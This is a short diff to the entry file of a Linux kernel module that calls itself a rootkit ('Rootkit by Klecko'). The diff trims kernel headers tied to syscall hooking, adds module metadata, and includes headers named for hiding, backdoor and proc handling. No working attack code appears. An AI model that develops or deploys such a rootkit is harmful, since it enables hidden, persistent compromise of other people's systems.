@@ -1,12 +1,4 @@
 #include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/kallsyms.h>
-#include <linux/unistd.h> // __NR_syscall
-#include <linux/version.h> // LINUX_VERSION_CODE
-#include <linux/string.h>
-#include <linux/kthread.h>
-#include <linux/delay.h>
-#include <asm/paravirt.h> // write_cr0
 
 #include "config.h"
 #include "hiding.h"
@@ -14,6 +6,10 @@
 #include "backdoor.h"
 #include "proc.h"
 
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Klecko");
+MODULE_DESCRIPTION("Rootkit by Klecko");
+MODULE_VERSION("0.1");
 
 //insmod
 static int __init lkm_init(void){
